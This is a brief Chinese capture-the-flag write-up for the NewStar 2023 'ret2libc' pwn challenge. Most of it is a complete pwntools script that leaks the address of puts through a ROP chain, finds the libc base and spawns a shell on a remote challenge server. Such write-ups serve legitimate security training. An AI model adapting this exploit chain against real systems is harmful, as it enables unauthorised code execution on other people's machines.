---
title: newstar2023 week2 - ret2libc
date: 2023/10/2 12:00:00
updated: 2024/7/25 12:34:56
tags:
    - noob
excerpt: 利用ret2libc技术实现远程代码执行。
---

## 文件分析

下载`ret2libc`, NX on, PIE off, Canary off, RELRO partial  
ghidra分析为64位程序

## 解题思路

参考我的moectf2023和cbctf的wp，很常规的一题

## EXPLOIT

```python
import LibcSearcher
from pwn import *
sh = remote('node4.buuoj.cn', 29167)
elf = ELF('ret2libc')

putsPlt = elf.plt['puts']
putsGot = elf.got['puts']
popRdiAddr = 0x400763
mainAddr = elf.symbols['main']

# payload 1
sh.sendline(b'0'*0x28 + p64(popRdiAddr) + p64(putsGot) + p64(putsPlt) + p64(mainAddr))

sh.recvuntil(b'time\n') # skip
data = sh.recv()
putsGotAddr = u64(data[:6] + b'\0\0')
libc = LibcSearcher.LibcSearcher('puts', putsGotAddr & 0xfff)
libcBase = putsGotAddr - libc.dump('puts')
shstrAddr = libcBase + libc.dump('str_bin_sh')
systemAddr = libcBase + libc.dump('system')
retAddr = 0x4006f1

# payload 2
sh.sendline(b'0'*0x28 + p64(popRdiAddr) + p64(shstrAddr) + p64(retAddr) + p64(systemAddr))

sh.interactive()
```

Done.
